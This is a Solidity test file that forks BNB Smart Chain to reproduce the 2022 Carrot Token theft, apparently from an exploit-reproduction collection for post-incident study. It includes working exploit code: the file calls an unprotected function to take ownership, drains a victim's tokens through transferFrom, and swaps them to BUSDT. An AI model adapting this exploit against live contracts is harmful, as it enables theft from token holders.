// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost :
// Attacker : 0xd11a93a8db5f8d3fb03b88b4b24c3ed01b8a411c
// Attack Contract : https://bscscan.com/address/0x5575406ef6b15eec1986c412b9fbe144522c45ae
// Vulnerable Contract : https://bscscan.com/address/0xcFF086EaD392CcB39C49eCda8C974ad5238452aC
// Attack Tx : https://bscscan.com/tx/0xa624660c29ee97f3f4ebd36232d8199e7c97533c9db711fa4027994aa11e01b9

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xcFF086EaD392CcB39C49eCda8C974ad5238452aC#code#L1406

// @Analysis
// Twitter BlockSec : https://twitter.com/BlockSecTeam/status/1579908411235237888
// Twitter 1nf0s3cpt (SunWeb3Sec) : https://twitter.com/1nf0s3cpt/status/1580116116151889920
// Article (in Chinese) : https://cloud.tencent.com/developer/article/2152960

/*
Carrot Token was exploited on 2022-10-10 12:53:41 (UTC) on Binance Smart Chain Mainnet. 
A total of $31,318 BUSDT was lost.

Pool address: 0x6863b549bf730863157318df4496ed111adfa64f

The Carrot token relays on '_allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance")'
to prevent unapproved token transfers, it follows an ACTION-CHECK pattern where the tokens are sent without check and 
the sub() function on the _allowances mapping verifies that the sender did had the permissions to move the tokens.
 
This final check can be avoided if the _msgSender() on the _isExcludedFromFee mapping is set to true, 
giving the _msgSender() the ability to move any user's tokens at its will. 

function transferFrom(
  address sender,
  address recipient,
  uint256 amount
) public virtual override returns (bool) {
  _beforeTransfer(_msgSender(),recipient,amount);
  
  if(_isExcludedFromFee[_msgSender()]){
      _transfer(sender, recipient, amount);
      return true;
  }
  _transfer(sender, recipient, amount);
  _approve(
      sender,
      _msgSender(),
      _allowances[sender][_msgSender()].sub(
          amount,
          "ERC20: transfer amount exceeds allowance"
      )
  );
  return true;
}

The only way to add an address to the _isExcludedFromFee mapping is if the owner of an external 
contract "Pool" is the caller of a transfer and the counter variable is set to 0. This variable 
would act as a safety measure to stop anyone else from adding their address after the exploiter has done it.

function _beforeTransfer( address from,address to,uint256 amount) private{
  if(from.isContract())
  if(ownership(pool).owner() == from && counter ==0){
      _isExcludedFromFee[from] = true;
      counter++;
  }          
  _beforeTokenTransfer(from, to, amount);
}

The Pool address is set via the onlyOwner initPool() function on the token.

function initPool(address _Pool) public onlyOwner {
    require(pool == address(0));
    pool = _Pool;
}

Finally, to set the owner of the pool contract the transReward() on the token is called with the change owner
function selector "0xbf699b4b" and the address desired, in the attack this would be "0x5575406ef6b15eec1986c412b9fbe144522c45ae".

Root cause: Insufficient access control to the migrateStake function.

Original PoC by: SunWeb3Sec 
Explanation by: Kayaba-Attribution
*/

interface ICarrot is IERC20 {
    function transReward(bytes memory data) external;
}

contract ContractTest is Test {
    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ICarrot constant CARROT_TOKEN = ICarrot(0xcFF086EaD392CcB39C49eCda8C974ad5238452aC);
    IERC20 constant BUSDT_TOKEN = IERC20(0x55d398326f99059fF775485246999027B3197955); // Binance USDT

    function setUp() public {
        vm.createSelectFork("bsc", 22_055_611);
        // Adding labels to improve stack traces' readability
        vm.label(address(PS_ROUTER), "PS_ROUTER");
        vm.label(address(CARROT_TOKEN), "CARROT_TOKEN");
        vm.label(address(BUSDT_TOKEN), "BUSDT_TOKEN");
        vm.label(address(0xF34c9a6AaAc94022f96D4589B73d498491f817FA), "CARROT_BUSDT_PAIR");
        vm.label(address(0x6863b549bf730863157318df4496eD111aDFA64f), "Pool");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker BUSDT balance before exploit", BUSDT_TOKEN.balanceOf(address(this)), 18
        );

        // Call vulnerable transReward() to set this contract as owner. No auth control
        CARROT_TOKEN.transReward(abi.encodeWithSelector(0xbf699b4b, address(this)));

        // Empty transferFrom() called during the exploit. Apparently not needed.
        // CARROT_TOKEN.transferFrom(address(this), address(CARROT_TOKEN), 0);

        // Call transferFrom() to steal CARROT tokens using the same amount used in the exploit
        CARROT_TOKEN.transferFrom(
            0x00B433800970286CF08F34C96cf07f35412F1161, address(this), 310_344_736_073_087_429_864_760
        );

        // Swap all stolen Carrot to BUSDT
        _CARROTToBUSDT();

        emit log_named_decimal_uint(
            "[End] Attacker BUSDT balance after exploit", BUSDT_TOKEN.balanceOf(address(this)), 18
        );
    }

    function migrateWithdraw(
        address,
        uint256 //callback
    ) public {}

    /**
     * Auxiliary function to swap all CARROT to BUSDT
     */
    function _CARROTToBUSDT() internal {
        CARROT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(CARROT_TOKEN);
        path[1] = address(BUSDT_TOKEN);
        PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            CARROT_TOKEN.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
